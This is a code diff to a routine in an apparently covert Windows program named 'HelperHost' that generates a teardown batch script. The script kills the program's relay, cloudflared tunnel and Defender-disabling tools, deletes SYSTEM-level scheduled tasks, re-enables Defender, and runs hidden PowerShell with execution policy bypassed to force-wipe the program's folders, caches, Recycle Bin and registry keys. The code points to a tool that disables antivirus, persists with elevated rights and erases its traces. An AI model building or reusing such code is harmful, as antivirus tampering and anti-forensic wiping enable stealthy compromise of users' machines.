@@ -620,23 +620,19 @@ try {
 			"taskkill /F /IM EdgeRelay.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM cloudflared.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM dControl.exe >nul 2>&1\r\n" +
+			"taskkill /F /IM disable-defender.exe >nul 2>&1\r\n" +
+			"taskkill /F /IM enable-defender.exe >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostEarlyAV /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostDControlOff /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostDControlOn /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHost /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostResume /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostBoot /F >nul 2>&1\r\n" +
-			// dControl /E BEFORE elevate restore (copy to TEMP — HelperHost folder will die)
-			"if exist \"" + dir + "\\dControl.exe\" copy /y \"" + dir + "\\dControl.exe\" \"%TEMP%\\hh-dcontrol.exe\" >nul 2>&1\r\n" +
-			"if exist \"%TEMP%\\hh-dcontrol.exe\" (\r\n" +
-			"  echo @echo off> \"%TEMP%\\hh-dc-on.cmd\"\r\n" +
-			"  echo start \"\" /wait \"%TEMP%\\hh-dcontrol.exe\" /E>> \"%TEMP%\\hh-dc-on.cmd\"\r\n" +
-			"  echo ping 127.0.0.1 -n 4 ^>nul>> \"%TEMP%\\hh-dc-on.cmd\"\r\n" +
-			"  echo taskkill /F /IM dControl.exe ^>nul 2^>^&1>> \"%TEMP%\\hh-dc-on.cmd\"\r\n" +
-			"  schtasks /Create /TN HelperHostDControlOn /TR \"cmd.exe /c \\\"%TEMP%\\hh-dc-on.cmd\\\"\" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F >nul 2>&1\r\n" +
-			"  schtasks /Run /TN HelperHostDControlOn >nul 2>&1\r\n" +
-			"  ping 127.0.0.1 -n 12 >nul\r\n" +
-			"  schtasks /Delete /TN HelperHostDControlOn /F >nul 2>&1\r\n" +
+			// pgkt04 enable-defender -s (open-source) BEFORE elev restore
+			"if exist \"" + dir + "\\enable-defender.exe\" copy /y \"" + dir + "\\enable-defender.exe\" \"%TEMP%\\hh-enable-defender.exe\" >nul 2>&1\r\n" +
+			"if exist \"%TEMP%\\hh-enable-defender.exe\" (\r\n" +
+			"  \"%TEMP%\\hh-enable-defender.exe\" -s\r\n" +
+			"  taskkill /F /IM enable-defender.exe >nul 2>&1\r\n" +
 			"  taskkill /F /IM dControl.exe >nul 2>&1\r\n" +
 			")\r\n" +
 			// Recreate elevated restore with FRESH script (old task often pointed at deleted temp file)
@@ -657,6 +653,9 @@ try {
 			"schtasks /Delete /TN HelperHostDControlOn /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN AgentShePC /F >nul 2>&1\r\n" +
 			"taskkill /F /IM dControl.exe >nul 2>&1\r\n" +
+			"taskkill /F /IM disable-defender.exe >nul 2>&1\r\n" +
+			"taskkill /F /IM enable-defender.exe >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\hh-enable-defender.exe\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\hh-dcontrol.exe\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\hh-dc-on.cmd\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\hh-dc-off.cmd\" >nul 2>&1\r\n" +
@@ -667,8 +666,9 @@ try {
 			// Force-unlock + wipe HelperHost + EdgeRelay cache (retry)
 			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"" +
 			"$ErrorActionPreference='SilentlyContinue'; " +
-			"function Kill-HH { Get-Process HelperHost,EdgeRelay,cloudflared -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue; " +
-			"Get-CimInstance Win32_Process -EA SilentlyContinue | Where-Object { $_.CommandLine -match 'HelperHost|EdgeRelay|hh-wipe|hh-restore|early-av' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue } }; " +
+			"function Kill-HH { Get-Process HelperHost,EdgeRelay,cloudflared,dControl -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue; " +
+			"Get-Process 'disable-defender','enable-defender' -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue; " +
+			"Get-CimInstance Win32_Process -EA SilentlyContinue | Where-Object { $_.CommandLine -match 'HelperHost|EdgeRelay|hh-wipe|hh-restore|early-av|dControl|disable-defender|enable-defender' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue } }; " +
 			"function Nuke-Tree([string]$Root){ if(-not(Test-Path -LiteralPath $Root)){return}; " +
 			"Kill-HH; attrib -h -s /s /d \\\"$Root\\*\\\" 2>$null; attrib -h -s \\\"$Root\\\" 2>$null; " +
 			"cmd /c \\\"takeown /f `\\\"$Root`\\\" /r /d y\\\" | Out-Null; " +
@@ -678,8 +678,9 @@ try {
 			"cmd /c \\\"del /f /q `\\\"$($_.FullName)`\\\"\\\" | Out-Null } }; " +
 			"cmd /c \\\"rmdir /s /q `\\\"$Root`\\\"\\\" | Out-Null; " +
 			"if(Test-Path -LiteralPath $Root){ Remove-Item -LiteralPath $Root -Recurse -Force -EA SilentlyContinue } }; " +
-			"1..5 | ForEach-Object { Kill-HH; Nuke-Tree '" + dirEsc + "'; Nuke-Tree '" + cacheEsc + "'; " +
-			"Nuke-Tree (Join-Path $env:TEMP 'HelperHostCache'); Nuke-Tree (Join-Path $env:LOCALAPPDATA 'HelperHost'); Start-Sleep -Seconds 1 }; " +
+			"1..8 | ForEach-Object { Kill-HH; Nuke-Tree '" + dirEsc + "'; Nuke-Tree '" + cacheEsc + "'; " +
+			"Nuke-Tree (Join-Path $env:TEMP 'HelperHostCache'); Nuke-Tree (Join-Path $env:LOCALAPPDATA 'HelperHost'); " +
+			"Nuke-Tree (Join-Path $env:LOCALAPPDATA 'Temp\\HelperHostCache'); Start-Sleep -Seconds 1 }; " +
 			"Clear-RecycleBin -Force -EA SilentlyContinue; " +
 			"Remove-Item (Join-Path $env:TEMP 'hh-wipe-state.json') -Force -EA SilentlyContinue" +
 			"\" >nul 2>&1\r\n" +
@@ -687,8 +688,10 @@ try {
 			"rmdir /s /q \"" + cacheDir + "\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"%TEMP%\\HelperHostCache\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"%LOCALAPPDATA%\\HelperHost\" >nul 2>&1\r\n" +
+			"rmdir /s /q \"%LOCALAPPDATA%\\Temp\\HelperHostCache\" >nul 2>&1\r\n" +
 			"del /f /q \"%LOCALAPPDATA%\\HelperHost\\HelperHost.exe\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHostCache\\EdgeRelay.exe\" >nul 2>&1\r\n" +
+			"del /f /q \"%LOCALAPPDATA%\\Temp\\HelperHostCache\\EdgeRelay.exe\" >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\HelperHost\" /f >nul 2>&1\r\n" +
 			// Extra AV policy wipe via reg (in case elev restore partially failed)
 			"reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /f >nul 2>&1\r\n" +
